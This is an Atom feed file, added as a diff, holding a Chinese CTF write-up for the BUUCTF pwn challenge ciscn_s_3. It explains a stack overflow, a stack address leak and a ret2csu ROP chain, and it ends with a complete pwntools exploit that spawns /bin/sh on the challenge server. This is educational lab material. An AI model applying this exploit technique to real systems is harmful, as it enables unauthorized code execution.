@@ -1,0 +1,104 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://example.com</id>
+    <title>Blog • Posts by &#34;buuctf&#34; category</title>
+    <link href="http://example.com" />
+    <updated>2023-05-04T11:33:55.000Z</updated>
+    <category term="pwn" />
+    <category term="二进制" />
+    <category term="ctf" />
+    <category term="Linux" />
+    <category term="ret2csu" />
+    <category term="系统调用" />
+    <entry>
+        <id>http://example.com/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/</id>
+        <title>ciscn_s_3（利用系统调用+ret2csu）</title>
+        <link rel="alternate" href="http://example.com/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/"/>
+        <content type="html">&lt;h1 id=&#34;ciscn_s_3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ciscn_s_3&#34;&gt;#&lt;/a&gt; ciscn_s_3&lt;/h1&gt;
+&lt;h3 id=&#34;1下载附件后查看程序信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1下载附件后查看程序信息&#34;&gt;#&lt;/a&gt; 1. 下载附件后查看程序信息&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sKKK.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到是 64 位程序，并且开启了 NX&lt;/p&gt;
+&lt;h3 id=&#34;2利用ida反汇编&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2利用ida反汇编&#34;&gt;#&lt;/a&gt; 2. 利用 ida 反汇编&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6s85d.md.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现有个 vul 函数，进入查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sJPA.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现是 sys_read 函数，并且可以通过 &lt;strong&gt;sys_read 溢出&lt;/strong&gt;，查看汇编代码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sY8I.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;发现有 syscall，由此判断是系统调用，那么我们通过 &lt;strong&gt;控制寄存器&lt;/strong&gt; 的方式来进行系统调用然后 getshell&lt;/p&gt;
+&lt;h3 id=&#34;3漏洞利用分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3漏洞利用分析&#34;&gt;#&lt;/a&gt; 3. 漏洞利用分析&lt;/h3&gt;
+&lt;p&gt;此处放上之前的文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3dnYuY24vMjAyMy8wOC8yOS9MaW51eC8lRTclQjMlQkIlRTclQkIlOUYlRTglQjAlODMlRTclOTQlQTgv&#34;&gt;https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;上面链接里能看到 64 位系统的系统调用号，找到 execve 命令是 59（0x3b）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;
+int execve(const char *filename, char *const argv[], char *const envp[]);
+
+//const char *filename 为要执行文件的地址
+
+//char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名
+
+//char *const envp[]：一般传递NULL，表示可变参数的结尾。
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们要执行的是  &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)&lt;/code&gt;  来 getshell&lt;/p&gt;
+&lt;h3 id=&#34;4控制寄存器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4控制寄存器&#34;&gt;#&lt;/a&gt; 4. 控制寄存器&lt;/h3&gt;
+&lt;p&gt;将 0x3b 存入 rax 寄存器，64 位系统调用寄存器顺序依次为：rdi，rsi，rdx&lt;/p&gt;
+&lt;p&gt;本想着通过 Ropgadgets 查找对应寄存器构造 rop 链&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sHR1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;但是发现无法控制 rax 寄存器与 rdx 寄存器，所以要使用其他方法&lt;/p&gt;
+&lt;p&gt;查看汇编发现有个 gadgets 函数，但是不知道为什么在代码流程图里没有显示后面的部分&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pP6sxde.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;此处看到 0x3b 存入了 rax，正好是 execve 的系统调用号 (也可以在 ida 窗口中按 alt+t 查找 mov rax,3bh 指令，找到指令存储位置为 0x4004E2)&lt;/p&gt;
+&lt;p&gt;接着需要控制相应的传参寄存器，rdi，rsi，rdx，rcx, r8, r9。因为可以溢出的字符很多，那么我们可以利用   &lt;strong&gt;csu_init（ret2csu）&lt;/strong&gt;  这一段代码，因为 64 位程序需要该函数对 libc 进行初始化，一般的程序都会调用 libc 函数，所以 &lt;strong&gt;一定存在&lt;/strong&gt; 这个函数，并且该函数先于 main 函数执行&lt;/p&gt;
+&lt;p&gt;原理:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly92dnd3dnYuY24vMjAyMy8wOC8yNC9wd24vUk9QL3JldDJjc3U=&#34;&gt;https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu&lt;/span&gt;&lt;/p&gt;
+&lt;h4 id=&#34;5构造rop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5构造rop&#34;&gt;#&lt;/a&gt; 5. 构造 rop&lt;/h4&gt;
+&lt;p&gt;通过 ida 可以找到 csu 段地址，下面为 gadgets1&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcCbss.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;当我们进入 gadgets1 时，执行了 add rsp ,8 所以要填充 8 个字符，后续的 rbx 要为 0 才能不跳转，rbp 为 1 使其与后续加 1 后的 rbx 相同，r12 不需要所以可以任意，r13，r14，r15 分别会在 gadgets2 控制 rdx，rsi，rdi，填入我们需要的值，具体值如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;rbx=0&lt;/li&gt;
+&lt;li&gt;rbp=1&lt;/li&gt;
+&lt;li&gt;r12=0&lt;/li&gt;
+&lt;li&gt;r13=0  （对应 rdx=0）&lt;/li&gt;
+&lt;li&gt;r14=0  （对应 rsi=0）&lt;/li&gt;
+&lt;li&gt;r15=&amp;quot;binsh&amp;quot; 的地址  （对应 rdi=&amp;quot;/bin/sh&amp;quot;）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;此处执行的是  &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,0,0)  &lt;/code&gt;  execve( rdi , rsi , rdx )&lt;/p&gt;
+&lt;p&gt;由此我们需要找到 &amp;quot;/bin/sh&amp;quot; 地址，由于程序内找不到 &amp;quot;/bin/sh&amp;quot; , 所以需要我们自己写入 &amp;quot;/bin/sh&amp;quot;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcCjoV.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;由上面的图可以看到，sys_wrtie 会输出 0x30 个字符，而 buf 在栈上只有 0x10 的大小，后面紧接着的 0x10 为 ret 和初始的 rbp 所占空间，后面 8 个字符为栈上的某一地址， &lt;strong&gt;利用该地址减去与 &amp;quot;/bin/sh&amp;quot; 地址的偏移量&lt;/strong&gt; 即可获得 &amp;quot;/bin/sh&amp;quot; 地址。（这里是因为开启了保护每次在栈上的地址不同，而偏移是不会变的）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查看方式 1&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcii9S.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;由上面的图片可以看出输入的字符串的地址（这里因为溢出所以应该为 ddf0），而看到距离 rsp 为 0x20 的地方输出了我们调试的程序的名称，这个一般是保存在 avrg [0]，这个是栈上的地址&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查看方式 2&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcFrGT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;首先为写入的 buf 地址，然后在 0x20 大小后为栈地址，原因入下图，因此通过 sys_write 即可泄露&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://s1.ax1x.com/2023/09/09/pPcAxxS.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;由于开启了保护所以写入栈的位置是不固定的，但是可以通过当此运行时泄露的栈地址减去固定的偏移量即可得到写入的字符串地址&lt;/p&gt;
+&lt;h3 id=&#34;7字符串地址计算方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7字符串地址计算方法&#34;&gt;#&lt;/a&gt; 7. 字符串地址计算方法:&lt;/h3&gt;
+&lt;p&gt;通过上面的 0x7fffffffdf38-0x7fffffffddf0=0x148 , 在计算栈的偏移时是 0x148（不知道是不是因为计算错误），但是线上靶场的环境栈的偏移是 0x118。&lt;/p&gt;
+&lt;p&gt;在本地可以利用 patchelf 切换 libc 版本&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./ciscn_s_3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有了偏移之后就可以通过偏移量来计算输入的字符串地址：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;输入字符串地址 = 泄露的栈地址 - 0x118&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;至此就得到了 &amp;quot;/bin/sh&amp;quot; 地址&lt;/p&gt;
+&lt;h3 id=&#34;8构造exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8构造exp&#34;&gt;#&lt;/a&gt; 8. 构造 exp&lt;/h3&gt;
+&lt;p&gt;因为 &amp;quot;/bin/sh&amp;quot; 占 7 个字节，需要改成 &amp;quot;/bin/sh\x00&amp;quot; 来用隔断符来满足 8 个字节进行对齐&lt;/p&gt;
+&lt;p&gt;先执行 syscall 还是先到 gadgets:&lt;/p&gt;
+&lt;p&gt;先 gadgets 最后返回到 syscall&lt;/p&gt;
+&lt;p&gt;系统调用号与 syscall 之间的执行顺序：&lt;/p&gt;
+&lt;p&gt;系统调用号执行后返回到 syscall，参数都在前面&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26711&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./ciscn_s_3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x04004ED&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;execve&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0004004E2&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#mov rax,3BH; ret;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;syscall&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000400501&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gadgets1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x000040059a&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;gadgets2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x0000400580&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;rdi_ret&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x004005a3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;csu&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gadgets1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rbp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r12&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r13&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r14&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r15&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#此处 r15 的值可有可无，因为后面仍然调用 rdi_ret 来传参&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    payload&lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;gadgets2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdi_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;execve&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;syscall&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;/bin/sh\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 此处之间填充到 ret，没有考虑 rbp，gdb 中调试就可以发现&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;binsh&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x118&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#减去偏移获得 &#34;/bin/sh&#34; 地址&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;csu&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;binsh&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 这里的 binsh+0x50 是传入字符串 &#34;/bin/sh&#34; 后开始，到 p64（execve）&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#p.recv()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;借用别人的一张图理解 binsh+0x50&lt;br /&gt;
+&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20210423174224878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXlpY2hlbnNzcw==,size_16,color_FFFFFF,t_70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9aTEZ4RA==&#34;&gt;http://t.csdn.cn/ZLFxD&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9TU1k5bw==&#34;&gt;http://t.csdn.cn/SSY9o&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;注意：不知道是不是因为部分地方没写对，用之前的 csu 方法有点问题，总要 binsh+0x50 才可以&lt;/p&gt;
+</content>
+        <category term="pwn" />
+        <category term="ctf" />
+        <category term="ret2csu" />
+        <category term="系统调用" />
+        <updated>2023-05-04T11:33:55.000Z</updated>
+    </entry>
+</feed>
